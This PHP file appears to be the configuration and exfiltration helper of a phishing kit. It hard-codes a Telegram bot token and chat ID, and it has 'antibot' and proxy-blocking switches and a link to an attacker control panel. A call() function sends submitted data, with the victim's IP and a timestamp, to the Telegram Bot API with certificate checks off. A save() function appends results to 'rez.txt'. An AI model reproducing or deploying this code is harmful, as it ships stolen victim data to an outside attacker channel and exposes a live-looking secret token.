<?php

$zbayb = "8477484223:AAG-Krso8h-uguOIKxFKngfc2uzFncfvPqw";
$id = "-5282280577";

$antibot = "no";

$block_proxy = "no";

$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("clients/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");

function call($msg){
    global $zbayb;
    global $panel_link;
    global $id;
    $info = "\n\n/- MORE INFO -/\nIP: ".$_SERVER['REMOTE_ADDR']."\nTIME: ".date("m/d/Y h:i:sa");

    $url = 'https://api.telegram.org/bot'.$zbayb.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info);

    $log = fopen(__DIR__."/telegram_debug.log", "a");
    fwrite($log, "=== ".date("Y-m-d H:i:s")." ===\n");
    fwrite($log, "URL: ".$url."\n");

    $c = curl_init($url);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($c);

    $error = curl_error($c);
    $errno = curl_errno($c);
    $http_code = curl_getinfo($c, CURLINFO_HTTP_CODE);

    fwrite($log, "Response: ".$res."\n");
    fwrite($log, "HTTP Code: ".$http_code."\n");
    fwrite($log, "cURL Error (".$errno."): ".$error."\n");
    fwrite($log, "\n");

    fclose($log);
    curl_close($c);
    return $res;
}

function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}

?>